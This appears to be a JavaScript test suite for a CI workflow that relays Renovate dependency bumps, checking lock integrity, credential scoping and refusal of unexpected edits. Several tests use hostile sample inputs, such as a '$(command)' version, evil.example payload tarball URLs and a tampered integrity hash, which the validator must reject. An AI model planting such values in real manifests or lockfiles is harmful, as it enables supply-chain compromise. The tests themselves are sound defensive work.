  await assert.rejects(publish('synthetic-test-token'), /Refusing to overwrite a PR edit/);
});

test('Sonar version publication refuses unrelated PR edits to scanner scope or encoding', () => {
  const file = '.sonarcloud.properties';
  const original = 'sonar.python.version=3.13\nsonar.sourceEncoding=UTF-8\n';
  const content = original.replace('3.13', '3.14');
  const base = blobEntries([[file, original]]);
  const files = [{ file, content }];
  assert.deepEqual(selectGeneratedUpdates(files, base, base), files);
  assert.deepEqual(selectGeneratedUpdates(files, base, blobEntries([[file, content]])), []);
  for (const edited of [`${original}sonar.exclusions=**\n`, original.replace('UTF-8', 'ISO-8859-1')]) {
    assert.throws(() => selectGeneratedUpdates(files, base, blobEntries([[file, edited]])), /overwrite a PR edit/);
  }
});

test('workflow executes only trusted base scripts, keeps credentials scoped, and does not force refs', () => {
  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
  assert.match(workflow, /pull_request_target:/);
  assert.match(workflow, /persist-credentials: false/);
  assert.doesNotMatch(workflow, /^\s+contents: write/m);
  assert.match(workflow, /RENOVATE_SYNC_TOKEN: \$\{\{ secrets.RENOVATE_SYNC_TOKEN }}/);
  assert.match(workflow, /python -m pip install --require-hashes --only-binary=:all:/);
  assert.match(workflow, /--requirement \.github\/requirements\/lock-compiler\.txt/);
  assert.match(workflow, /--constraint \.github\/requirements\/lock-compiler\.in/);
  assert.doesNotMatch(workflow, /pip install[^\n]*pip-tools==/);
  const compilerLock = readFileSync(resolveRepoPath('.github/requirements/lock-compiler.txt'), 'utf8');
  const requirements = compilerLock.replaceAll(/\\\r?\n[\t ]*/g, ' ').split(/\r?\n/).filter((line) => /^[a-z]/i.test(line));
  assert.ok(requirements.length > 1, 'The compiler lock must include transitive dependencies');
  assert.ok(requirements.every((line) => /^[a-z0-9-]+==\S+ +--hash=sha256:[a-f0-9]{64}(?: |$)/i.test(line)));
  assert.match(compilerLock, /^pip-tools==7\.6\.2 /m);
  const helper = readFileSync(resolveRepoPath('scripts/versions/renovate-framework-sync.mjs'), 'utf8');
  assert.match(helper, /force: false/);
  assert.ok(helper.includes('parents: [state.headSha]'));
  assert.ok(helper.includes(config.gitIgnoredAuthors[0]));
});

const guidePath = 'docs/LINTING_AND_CODE_QUALITY.md';
const codeqlActionPath = '.github/actions/codeql-action/action.yml';
const codeqlLockPath = '.github/actions/codeql-action/bundle-lock.json';
const nextActionSha = 'f'.repeat(40);

test('Renovate routes only the documented action wrappers to guide regeneration', () => {
  const rules = config.packageRules.filter((rule) => rule.addLabels?.includes('action-docs-version'));
  assert.equal(rules.length, 1);
  assert.deepEqual(rules[0].matchManagers, ['github-actions']);
  assert.deepEqual(rules[0].matchDepTypes, ['action']);
  assert.deepEqual(rules[0].matchFileNames, documentedActionPaths);
  assert.deepEqual(rules[0].matchPackageNames, ['actions/upload-artifact', 'actions/download-artifact', 'github/codeql-action']);
  assert.deepEqual(config.packageRules.find((rule) => rule.groupName === 'CodeQL action').matchPackageNames, ['github/codeql-action']);
  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
  assert.match(workflow, /contains\(github.event.pull_request.labels.\*.name, 'action-docs-version'\) \|\|\r?\n/);
  assert.match(workflow, /!contains\([^\n]+ 'framework-version'\) &&\s+!contains\([^\n]+ 'nextjs-version'\) &&\s+contains\([^\n]+ 'action-docs-version'\)\s+id: actions_docs[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs prepare-actions/);
  assert.match(workflow, /steps.actions_docs.outputs.changed == 'true' \|\|[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs publish/);
});

function actionGuideFixture(t, onWrite) {
  const blobs = new Map();
  const baseLock = readFileSync(resolveRepoPath(codeqlLockPath), 'utf8');
  const nextLock = JSON.parse(baseLock);
  nextLock.actionSha = nextActionSha;
  nextLock.defaults = { cliVersion: '99.1.2', bundleVersion: 'codeql-bundle-v99.1.2' };
  nextLock.release.tag_name = nextLock.defaults.bundleVersion;
  const defaultsUrl = `https://raw.githubusercontent.com/github/codeql-action/${nextActionSha}/src/defaults.json`;
  const releaseUrl = `https://api.github.com/repos/github/codeql-action/releases/tags/${nextLock.release.tag_name}`;
  const upstreamResponses = new Map([[defaultsUrl, nextLock.defaults], [releaseUrl, nextLock.release]]);
  const upstreamRequests = [];
  const fixture = publicationFixture(t, (route, options) => {
    if (options.method !== 'GET') return onWrite?.(route, JSON.parse(options.body)) ?? assert.fail(route);
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  }, (url, options) => {
    assert.equal(options.method, 'GET');
    assert.deepEqual(options.headers, { Accept: 'application/json' });
    assert.ok(upstreamResponses.has(url), url);
    upstreamRequests.push(url);
    return upstreamResponses.get(url);
  });
  const { base, head, state } = fixture;
  // Both routes start at the same complete base in this fixture.
  for (const [file, entry] of base) head.set(file, entry);
  const add = (tree, file, content, mode = '100644') => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { type: 'blob', mode, sha });
  };
  const wrappers = new Map(documentedActionPaths.map((file) => [file, readFileSync(resolveRepoPath(file), 'utf8')]));
  for (const [file, content] of wrappers) {
    add(base, file, content);
    add(head, file, content);
  }
  add(base, codeqlLockPath, baseLock);
  add(head, codeqlLockPath, baseLock);
  const output = path.join(process.env.RUNNER_TEMP, 'output');
  const originalOutput = process.env.GITHUB_OUTPUT;
  process.env.GITHUB_OUTPUT = output;
  t.after(() => {
    if (originalOutput === undefined) delete process.env.GITHUB_OUTPUT;
    else process.env.GITHUB_OUTPUT = originalOutput;
  });
  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
  return { ...fixture, wrappers, output, nextLock, upstreamRequests, defaultsUrl, releaseUrl,
    stateFile: path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'),
    change: (file, content, mode) => add(head, file, content, mode),
    prepare: () => prepare(event, 'synthetic-test-token', 'actions'),
  };
}

function nextActionPin(content, version = 'v99.1.2') {
  return content.replaceAll(/@[a-f0-9]{40} # v\d+\.\d+\.\d+/g, `@${nextActionSha} # ${version}`);
}

for (const file of documentedActionPaths) {
  test(`Renovate regenerates the guide for an isolated bump to ${file}`, async (t) => {
    const { wrappers, change, prepare: prepareGuide, output, stateFile, nextLock, upstreamRequests, defaultsUrl, releaseUrl } = actionGuideFixture(t);
    const original = wrappers.get(file);
    change(file, nextActionPin(original));
    if (file === codeqlActionPath) change(codeqlLockPath, JSON.stringify(nextLock));
    await prepareGuide();
    assert.match(readFileSync(output, 'utf8'), /^changed=true\r?\npython_locks=false/m);
    const state = JSON.parse(readFileSync(stateFile, 'utf8'));
    assert.deepEqual(state.changed, [file]);
    const guide = readFileSync(resolveRepoPath(guidePath), 'utf8');
    if (file === codeqlActionPath) {
      const pin = state.guide.split('\n').find((line) => line.includes('CodeQL Action** is pinned'));
      assert.match(pin, /github\/codeql-action@f{40}` \(v99\.1\.2\)/);
      assert.deepEqual(upstreamRequests, [defaultsUrl, releaseUrl]);
    } else {
      const action = file.split('/')[2];
      assert.ok(state.guide.includes(`actions/${action}@v99.1.2`));
      assert.deepEqual(upstreamRequests, []);
    }
    assert.notEqual(state.guide, guide);
    assert.equal(readFileSync(resolveRepoPath(file), 'utf8'), original);
  });
}

test('CodeQL action guide publication preserves the validated PR lock and a repeat run is a no-op', async (t) => {
  const writes = [];
  const { wrappers, change, prepare: prepareGuide, headTreeSha, state, stateFile, nextLock } = actionGuideFixture(t, (route, body) => {
    writes.push({ route, body });
    return { sha: String(writes.length).repeat(40) };
  });
  change(codeqlActionPath, nextActionPin(wrappers.get(codeqlActionPath)));
  change(codeqlLockPath, JSON.stringify(nextLock));
  await prepareGuide();
  const { guide } = JSON.parse(readFileSync(stateFile, 'utf8'));
  await publish('synthetic-test-token');
  assert.deepEqual(writes.map(({ route }) => route), ['git/blobs', 'git/trees', 'git/commits', 'git/refs/heads/renovate%2Fframework']);
  assert.equal(Buffer.from(writes[0].body.content, 'base64').toString('utf8'), guide);
  assert.deepEqual(writes[1].body, { base_tree: headTreeSha, tree: [{ path: guidePath, mode: '100644', type: 'blob', sha: '1'.repeat(40) }] });
  assert.deepEqual(writes[2].body.parents, [state.headSha]);
  assert.deepEqual(writes[3].body, { sha: '3'.repeat(40), force: false });
  change(guidePath, guide);
  await prepareGuide();
  await publish('synthetic-test-token');
  assert.equal(writes.length, 4);
});

test('CodeQL relay rejects unpaired, stale and tampered locks before publication', async (t) => {
  const { base, head, wrappers, change, prepare: prepareGuide, mock, output, stateFile,
    nextLock, upstreamRequests, defaultsUrl, releaseUrl } = actionGuideFixture(t);
  const beforeState = readFileSync(stateFile, 'utf8');
  const lock = JSON.stringify(nextLock);
  change(codeqlLockPath, lock);
  await assert.rejects(prepareGuide(), /lock change requires a new CodeQL action SHA/);

  change(codeqlActionPath, nextActionPin(wrappers.get(codeqlActionPath)));
  head.set(codeqlLockPath, base.get(codeqlLockPath));
  await assert.rejects(prepareGuide(), /pin changed without a bundle lock update.*--refresh-lock/);
  change(codeqlLockPath, JSON.stringify({ ...nextLock, actionSha: 'a'.repeat(40) }));
  await assert.rejects(prepareGuide(), /lock does not match the proposed action pin/);
  change(codeqlLockPath, lock, '120000');
  await assert.rejects(prepareGuide(), /unchanged regular file mode/);
  assert.deepEqual(upstreamRequests, []);

  for (const content of [
    lock.replaceAll('99.1.2', '99.1.3'),
    lock.replace(nextLock.release.assets[2].digest, `sha256:${'0'.repeat(64)}`),
    JSON.stringify({ ...nextLock, release: { ...nextLock.release, assets: nextLock.release.assets.slice(1) } }),
    JSON.stringify({ ...nextLock, release: { ...nextLock.release, url: 'https://example.invalid/release' } }),
  ]) {
    change(codeqlLockPath, content);
    await assert.rejects(prepareGuide(), /lock differs from the published bundle metadata/);
    assert.deepEqual(upstreamRequests.splice(0), [defaultsUrl, releaseUrl]);
  }
  assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
  assert.equal(existsSync(output), false);
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});

test('action guide preparation rejects changes outside the exact pin values before publication', async (t) => {
  const { change, wrappers, prepare: prepareGuide, head, base, mock, output, stateFile } = actionGuideFixture(t);
  const [upload, , codeql] = documentedActionPaths;
  const original = wrappers.get(upload);
  const bumped = nextActionPin(original);
  const beforeState = readFileSync(stateFile, 'utf8');
  for (const [file, content, error, mode] of [
    ['.github/workflows/qodana_code_quality.yml', 'unrelated workflow edit', /Unexpected file/],
    ['docs/LINTING_AND_CODE_QUALITY.template.md', 'template edit', /Unexpected file/],
    [upload, bumped, /unchanged regular file mode/, '120000'],
    [upload, bumped.replace('default: artifact', 'default: changed'), /only the documented action pins/],
    [upload, bumped.replace('actions/upload-artifact@', 'actions/download-artifact@'), /only the documented action pins/],
    [upload, bumped.replace('f'.repeat(40), 'main'), /Expected a SHA pin/],
    [upload, nextActionPin(original, 'latest'), /Expected a SHA pin/],
    [codeql, wrappers.get(codeql).replace(/@[a-f0-9]{40} # v\d+\.\d+\.\d+/, `@${nextActionSha} # v99.1.2`), /CodeQL action pins must agree/],
    [guidePath, 'unrelated guide edit', /Refusing to overwrite/],
  ]) {
    change(upload, bumped);
    change(file, content, mode);
    await assert.rejects(prepareGuide(), error);
    if (base.has(file)) head.set(file, base.get(file));
    else head.delete(file);
    assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
    assert.equal(existsSync(output), false);
  }
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});


test('npm relay accepts stable dependency-only updates and requires a matching lock root', () => {
  const original = JSON.parse(readFileSync(resolveRepoPath('utils/nextjs-dash/package.json'), 'utf8'));
  const proposed = structuredClone(original);
  proposed.dependencies.next = '99.1.2';
  const lock = { name: proposed.name, version: proposed.version, lockfileVersion: 3, packages: { '': proposed } };
  const validate = (manifest = proposed, proposedLock = lock) => validateNextjsChange(
    JSON.stringify(original), JSON.stringify(manifest), JSON.stringify(proposedLock), JSON.stringify(lock));
  assert.deepEqual(validate(), ['NEXTJS_VERSION']);
  assert.deepEqual(validateNextjsChange(JSON.stringify(original), JSON.stringify(original),
    JSON.stringify({ ...lock, packages: { '': original } }),
    JSON.stringify({ ...lock, packages: { '': original } })), []);
  for (const edit of [
    (value) => { value.scripts.build = 'malicious command'; },
    (value) => { value.packageManager = 'npm@99.0.0'; },
    (value) => { value.dependencies.newPackage = '1.0.0'; },
    (value) => { delete value.dependencies.react; },
    ...['file:../evil', 'https://evil.example/x', '1.0.0\n', '$(command)', 'latest'].map(
      (version) => (value) => { value.dependencies.next = version; }),
  ]) {
    const invalid = structuredClone(proposed);
    edit(invalid);
    assert.throws(() => validate(invalid), /Only existing|stable npm/);
  }
  assert.throws(() => validate(proposed, { ...lock, packages: { '': original } }), /Lockfile root/);
  assert.throws(() => validate(proposed, { ...lock, lockfileVersion: 2 }), /dashboard npm lockfile/);
});

test('npm relay detects each documented pin, combined changes, and unrelated dependency no-ops', () => {
  const original = JSON.parse(readFileSync(resolveRepoPath('utils/nextjs-dash/package.json'), 'utf8'));
  const validate = (proposed) => {
    const lock = JSON.stringify({ name: proposed.name, version: proposed.version, lockfileVersion: 3, packages: { '': proposed } });
    return validateNextjsChange(JSON.stringify(original), JSON.stringify(proposed), lock, lock);
  };
  const combined = structuredClone(original);
  for (const [key, section, name] of dashboardPackageVersions) {
    const proposed = structuredClone(original);
    proposed[section][name] = '99.1.2';
    combined[section][name] = proposed[section][name];
    assert.deepEqual(validate(proposed), [key], name);
    proposed[section][name] = '^99.1.2';
    assert.throws(() => validate(proposed), /stable npm|stable exact/, name);
  }
  assert.deepEqual(validate(combined), dashboardPackageVersions.map(([key]) => key));
  const unrelated = structuredClone(original);
  unrelated.dependencies['@emotion/react'] = '99.1.2';
  assert.deepEqual(validate(unrelated), []);
});

test('Next.js route allows only its manifests and generated docs/tags, never env or source edits', () => {
  const paths = generatedNextjsPaths();
  assert.ok(paths.includes('compose/utils.yml'));
  assert.ok(paths.some((file) => file.startsWith('.run/')));
  assert.ok(paths.includes('utils/nextjs-dash/README.md'));
  for (const file of ['docs/TESTING.md', 'docs/LINTING_AND_CODE_QUALITY.md', '.github/instructions/copilot-instructions.md']) {
    assert.ok(paths.includes(file), file);
  }
  const allowed = new Set(['utils/nextjs-dash/package.json', 'utils/nextjs-dash/package-lock.json', ...paths]);
  for (const file of ['compose/.env', 'scripts/tool.mjs', 'utils/nextjs-dash/app/page.tsx', '.github/workflows/framework_versions.yml']) {
    const base = blobEntries([[file, 'original']]);
    const head = blobEntries([[file, 'changed']]);
    assert.throws(() => validateFrameworkTree(base, head, allowed), /Unexpected file/);
  }
  const configRule = config.packageRules.find(({ addLabels }) => addLabels?.includes('nextjs-version'));
  assert.deepEqual(configRule.matchManagers, ['npm']);
  assert.deepEqual(configRule.matchFileNames, ['utils/nextjs-dash/package.json']);
  assert.deepEqual(configRule.matchPackageNames, dashboardPackageVersions.map(([_key, _section, name]) => name));
});

test('Next.js publication ignores unrelated pending framework outputs', async (t) => {
  const { state, mock } = publicationFixture(t);
  state.route = 'nextjs';
  state.changed = ['NEXTJS_VERSION'];
  writeFileSync(path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'), JSON.stringify(state));
  await publish('synthetic-test-token');
  assert.equal(mock.mock.callCount(), 5);
});


test('npm preparation rejects script changes before materializing PR data or issuing writes', async (t) => {
  const blobs = new Map();
  const { state, base, head, mock } = publicationFixture(t, (route, options) => {
    assert.equal(options.method, 'GET');
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  });
  for (const [file, entry] of head) base.set(file, entry);
  const add = (tree, file, content) => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { type: 'blob', mode: '100644', sha });
  };
  for (const tree of [base, head]) add(tree, 'compose/.env', env);
  const file = 'utils/nextjs-dash/package.json';
  const original = readFileSync(resolveRepoPath(file), 'utf8');
  const proposed = JSON.parse(original);
  proposed.dependencies.next = '99.1.2';
  proposed.scripts.build = 'malicious command';
  add(base, file, original);
  add(base, 'utils/nextjs-dash/package-lock.json', readFileSync(resolveRepoPath('utils/nextjs-dash/package-lock.json'), 'utf8'));
  add(head, file, JSON.stringify(proposed));
  add(head, 'utils/nextjs-dash/package-lock.json', JSON.stringify({
    name: proposed.name, version: proposed.version, lockfileVersion: 3, packages: { '': proposed },
  }));
  await assert.rejects(prepare({ number: state.number, pull_request: { base: { sha: state.baseSha } } },
    'synthetic-test-token', 'nextjs'), /Only existing npm/);
  assert.equal(readFileSync(resolveRepoPath(file), 'utf8'), original);
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});

test('complete npm lock validation rejects transitive tampering and missing independent evidence', () => {
  const manifest = readFileSync(resolveRepoPath('utils/nextjs-dash/package.json'), 'utf8');
  const trusted = readFileSync(resolveRepoPath('utils/nextjs-dash/package-lock.json'), 'utf8');
  const packagePath = 'node_modules/react';
  const validate = (lock, expected = trusted) => validateNextjsChange(manifest, manifest, JSON.stringify(lock), expected);
  const edits = [
    (lock) => { lock.packages[packagePath].resolved = 'https://evil.example/payload.tgz'; },
    (lock) => { lock.packages[packagePath].resolved = 'https://registry.npmjs.org/other/-/other-1.0.0.tgz'; },
    (lock) => { lock.packages[packagePath].integrity = 'sha512-attacker'; },
    (lock) => { lock.packages[packagePath].version = '99.1.2'; },
    (lock) => { delete lock.packages[packagePath]; },
    (lock) => { lock.packages['node_modules/extra'] = { version: '1.0.0' }; },
    (lock) => { lock.packages[packagePath] = { resolved: '../payload', link: true }; },
    (lock) => { lock.packages[packagePath].dependencies = { extra: '1.0.0' }; },
    (lock) => { lock.dependencies = { extra: { version: '1.0.0' } }; },
  ];
  for (const edit of edits) {
    const lock = JSON.parse(trusted);
    edit(lock);
    assert.throws(() => validate(lock), /Complete lockfile/);
  }
  assert.throws(() => validate(JSON.parse(trusted), null), /Complete lockfile/);
  // Formatting and object key order are not security-relevant differences.
  const reordered = Object.fromEntries(Object.entries(JSON.parse(trusted)).reverse());
  assert.deepEqual(validate(reordered), []);
});

test('lock regeneration runs real npm without installing dependencies or executing scripts', (t) => {
  const manifest = JSON.stringify({ name: 'relay-fixture', version: '1.0.0',
    scripts: { preinstall: 'node -e "require(\'fs\').writeFileSync(\'script-ran\', \'unsafe\')"' } });
  const lock = JSON.stringify({ name: 'relay-fixture', version: '1.0.0', lockfileVersion: 3,
    requires: true, packages: { '': { name: 'relay-fixture', version: '1.0.0', hasInstallScript: true } } });
  const spawn = childProcess.spawnSync;
  t.mock.method(childProcess, 'spawnSync', (...args) => {
    const result = spawn(...args);
    assert.equal(existsSync(path.join(args[2].cwd, 'script-ran')), false);
    assert.equal(existsSync(path.join(args[2].cwd, 'node_modules')), false);
    return result;
  });
  const result = JSON.parse(regenerateNextjsLock(manifest, lock));
  assert.equal(result.name, 'relay-fixture');
  assert.equal(result.lockfileVersion, 3);
});

test('npm regeneration isolates input/config/credentials and fails closed on tool failure', (t) => {
  const baseLock = '{"trusted":"base"}';
  const manifest = '{"name":"fixture"}';
  let directory;
  const mock = t.mock.method(childProcess, 'spawnSync', (executable, args, options) => {
    directory = options.cwd;
    assert.equal(executable, process.execPath);
    assert.equal(options.shell, false);
    assert.equal(options.timeout, 300_000);
    for (const flag of ['--package-lock-only', '--ignore-scripts', '--no-audit', '--no-fund',
      '--registry=https://registry.npmjs.org/']) assert.ok(args.includes(flag));
    assert.equal(readFileSync(path.join(directory, 'package-lock.json'), 'utf8'), baseLock);
    assert.equal(readFileSync(path.join(directory, 'package.json'), 'utf8'), manifest);
    assert.equal(readFileSync(path.join(directory, 'user.npmrc'), 'utf8'), '');
    assert.equal(readFileSync(path.join(directory, 'global.npmrc'), 'utf8'), '');
    assert.equal(options.env.GH_TOKEN, undefined);
    assert.equal(options.env.RENOVATE_SYNC_TOKEN, undefined);
    assert.equal(options.env.NPM_CONFIG_USERCONFIG, undefined);
    assert.equal(existsSync(path.join(directory, 'node_modules')), false);
    return { status: 1 };
  });
  assert.throws(() => regenerateNextjsLock(manifest, baseLock), /regeneration failed/);
  assert.equal(mock.mock.callCount(), 1);
  assert.equal(existsSync(directory), false);
});

test('npm regeneration rejects a mismatched packageManager pin before launching npm', (t) => {
  const mock = t.mock.method(childProcess, 'spawnSync', () => assert.fail('Mismatched npm must not run'));
  const manifest = JSON.stringify({ name: 'fixture', packageManager: 'npm@0.0.0' });
  assert.throws(() => regenerateNextjsLock(manifest, '{}'), /Trusted npm version must match/);
  assert.equal(mock.mock.callCount(), 0);
});

test('npm preparation rejects a tampered full lock before state/output/writes and accepts its trusted control', async (t) => {
  const blobs = new Map();
  const { state, base, head, mock } = publicationFixture(t, (route, options) => {
    assert.equal(options.method, 'GET');
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  });
  base.clear();
  head.clear();
  const add = (tree, file, content) => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { type: 'blob', mode: '100644', sha });
  };
  const originalManifest = readFileSync(resolveRepoPath('utils/nextjs-dash/package.json'), 'utf8');
  const fixtureManifest = JSON.parse(originalManifest);
  // npm is mocked here: test lock validation independently of the runner's npm
  // version. The packageManager mismatch guard is exercised separately above.
  delete fixtureManifest.packageManager;
  const manifest = JSON.stringify(fixtureManifest);
  const trusted = readFileSync(resolveRepoPath('utils/nextjs-dash/package-lock.json'), 'utf8');
  for (const tree of [base, head]) {
    add(tree, 'compose/.env', env);
    add(tree, 'utils/nextjs-dash/package.json', manifest);
    add(tree, 'utils/nextjs-dash/package-lock.json', trusted);
  }
  const tampered = JSON.parse(trusted);
  tampered.packages['node_modules/react'].resolved = 'https://evil.example/payload.tgz';
  add(head, 'utils/nextjs-dash/package-lock.json', JSON.stringify(tampered));
  const npm = t.mock.method(childProcess, 'spawnSync', (_executable, _args, options) => {
    assert.deepEqual(JSON.parse(readFileSync(path.join(options.cwd, 'package-lock.json'), 'utf8')), JSON.parse(trusted));
    return { status: 0 }; // Unchanged manifest: trusted base lock is the expected result.
  });
  const stateFile = path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json');
  const beforeState = readFileSync(stateFile, 'utf8');
  const output = path.join(process.env.RUNNER_TEMP, 'output');
  const originalOutput = process.env.GITHUB_OUTPUT;
  process.env.GITHUB_OUTPUT = output;
  t.after(() => {
    if (originalOutput === undefined) delete process.env.GITHUB_OUTPUT;
    else process.env.GITHUB_OUTPUT = originalOutput;
  });
  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
  await assert.rejects(prepare(event, 'synthetic-test-token', 'nextjs'), /Complete lockfile/);
  assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
  assert.equal(existsSync(output), false);
  assert.equal(readFileSync(resolveRepoPath('utils/nextjs-dash/package.json'), 'utf8'), originalManifest);
  add(head, 'utils/nextjs-dash/package-lock.json', trusted);
  await prepare(event, 'synthetic-test-token', 'nextjs');
  assert.deepEqual(JSON.parse(readFileSync(stateFile, 'utf8')).changed, []);
  assert.match(readFileSync(output, 'utf8'), /changed=false/);
  assert.equal(npm.mock.callCount(), 2);
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});


test('Gunicorn and Ruff updates use the framework route and install the hashed lock compiler', () => {
  for (const key of ['GUNICORN_VERSION', 'RUFF_VERSION']) {
    const proposed = env.replace(new RegExp(`^${key}:[^\\r\\n]+`, 'm'), `${key}: 99.0.0`);
    assert.deepEqual(validateVersionChange(env, proposed), [key]);
    assert.ok(pythonLockVersionKeys.includes(key));
  }
  const rule = config.packageRules.find(({ matchPackageNames, matchManagers }) =>
    matchManagers?.includes('pip_requirements') && matchPackageNames?.includes('gunicorn'));
  assert.equal(rule.enabled, false);
  assert.ok(rule.matchManagers.includes('pip-compile'));
  assert.ok(rule.matchPackageNames.includes('ruff'));
  const files = generatedFrameworkPaths();
  for (const file of [...ruffInputs, '.github/requirements/python-ci.txt', 'README.md', 'docs/tools-technologies.md']) {
    assert.ok(files.includes(file), file);
  }
  const script = readFileSync(resolveRepoPath('scripts/versions/renovate-framework-sync.mjs'), 'utf8');
  assert.ok(script.includes("route === 'pythonLock' || changed.some((key) => pythonLockVersionKeys.includes(key))"));
  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
  assert.match(workflow, /if: steps\.proposal\.outputs\.python_locks == 'true'/);
  assert.ok(workflow.includes('--requirement .github/requirements/lock-compiler.txt'));
});

const dockerCliDocs = ['README.md', 'docs/tools-technologies.md'];

test('Renovate routes only orchestrator Docker CLI version bumps to doc regeneration', () => {
  const rules = config.packageRules.filter((rule) => rule.addLabels?.includes('docker-cli-version'));
  assert.equal(rules.length, 1);
  assert.deepEqual(rules[0].matchManagers, ['dockerfile']);
  assert.deepEqual(rules[0].matchFileNames, [dockerCliDockerfile]);
  assert.deepEqual(rules[0].matchPackageNames, ['docker']);
  assert.deepEqual(rules[0].matchUpdateTypes, ['major', 'minor', 'patch']);
  assert.deepEqual(dockerCliDocuments().map(({ file }) => file), dockerCliDocs);
  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
  assert.match(workflow, /contains\(github.event.pull_request.labels.\*.name, 'docker-cli-version'\)\)\r?\n {4}runs-on:/);
  assert.match(workflow, /!contains\([^\n]+ 'framework-version'\) &&\s+!contains\([^\n]+ 'nextjs-version'\) &&\s+!contains\([^\n]+ 'action-docs-version'\) &&\s+contains\([^\n]+ 'docker-cli-version'\)\s+id: docker_cli_docs[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs prepare-docker-cli/);
  assert.match(workflow, /steps.docker_cli_docs.outputs.changed == 'true'\s+env:[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs publish/);
});

function dockerCliFixture(t, onWrite) {
  const blobs = new Map();
  const fixture = publicationFixture(t, (route, options) => {
    if (options.method !== 'GET') return onWrite?.(route, JSON.parse(options.body)) ?? assert.fail(route);
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  });
  const { base, head, state } = fixture;
  for (const [file, entry] of base) head.set(file, entry);
  const add = (tree, file, content, mode = '100644') => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { type: 'blob', mode, sha });
  };
  const dockerfile = readFileSync(resolveRepoPath(dockerCliDockerfile), 'utf8');
  for (const file of [dockerCliDockerfile, ...dockerCliDocs]) {
    const content = readFileSync(resolveRepoPath(file), 'utf8');
    add(base, file, content);
    add(head, file, content);
  }
  const output = path.join(process.env.RUNNER_TEMP, 'output');
  const originalOutput = process.env.GITHUB_OUTPUT;
  process.env.GITHUB_OUTPUT = output;
  t.after(() => {
    if (originalOutput === undefined) delete process.env.GITHUB_OUTPUT;
    else process.env.GITHUB_OUTPUT = originalOutput;
  });
  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
  const current = readDockerCliVersion(dockerfile);
  const bump = (version = '99.1.2', digest = '0'.repeat(64)) => dockerfile
    .replace(`docker:${current}-`, `docker:${version}-`)
    .replace(/(IMAGE_DOCKER_CLI=[^@\n]+@sha256:)[a-f0-9]{64}/, (_match, prefix) => `${prefix}${digest}`);
  return { ...fixture, dockerfile, current, bump, output,
    stateFile: path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'),
    change: (file, content, mode) => add(head, file, content, mode),
    prepare: () => prepare(event, 'synthetic-test-token', 'dockerCli') };
}

test('Docker CLI relay renders the proposed version into every documented table and repeats as a no-op', async (t) => {
  const writes = [];
  const { change, bump, current, prepare: prepareDocs, output, stateFile, headTreeSha, state } = dockerCliFixture(t, (route, body) => {
    writes.push({ route, body });
    return { sha: String(writes.length).repeat(40) };
  });
  change(dockerCliDockerfile, bump());
  await prepareDocs();
  assert.match(readFileSync(output, 'utf8'), /^changed=true\r?\npython_locks=false/m);
  const { changed, docs } = JSON.parse(readFileSync(stateFile, 'utf8'));
  assert.deepEqual(changed, ['DOCKER_CLI_VERSION']);
  assert.deepEqual(docs.map(({ file }) => file), dockerCliDocs);
  const normalize = (content) => content.replaceAll(/ +\|/g, ' |').replaceAll(/-+\|/g, '-|');
  for (const { file, content } of docs) {
    const original = readFileSync(resolveRepoPath(file), 'utf8');
    assert.match(content, /\| Docker CLI +\| 99\.1\.2 +\|/, file);
    assert.equal(normalize(content.replaceAll('| 99.1.2 ', `| ${current} `)), normalize(original), file);
  }
  await publish('synthetic-test-token');
  assert.deepEqual(writes.map(({ route }) => route), ['git/blobs', 'git/blobs', 'git/trees', 'git/commits', 'git/refs/heads/renovate%2Fframework']);
  assert.deepEqual(writes[2].body.tree.map(({ path: file }) => file), dockerCliDocs);
  assert.equal(writes[2].body.base_tree, headTreeSha);
  assert.equal(writes[3].body.message, 'chore: relay the documented Docker CLI version');
  assert.deepEqual(writes[3].body.parents, [state.headSha]);
  assert.equal(writes[4].body.force, false);
  for (const { file, content } of docs) change(file, content);
  await prepareDocs();
  await publish('synthetic-test-token');
  assert.equal(writes.length, 5);
});

test('Docker CLI digest-only refreshes do not regenerate documentation', async (t) => {
  const { change, dockerfile, current, bump, prepare: prepareDocs, output, stateFile } = dockerCliFixture(t);
  const refreshed = bump(current, 'f'.repeat(64));
  assert.notEqual(refreshed, dockerfile);
  change(dockerCliDockerfile, refreshed);
  await prepareDocs();
  assert.match(readFileSync(output, 'utf8'), /^changed=false/m);
  assert.deepEqual(JSON.parse(readFileSync(stateFile, 'utf8')).changed, []);
});
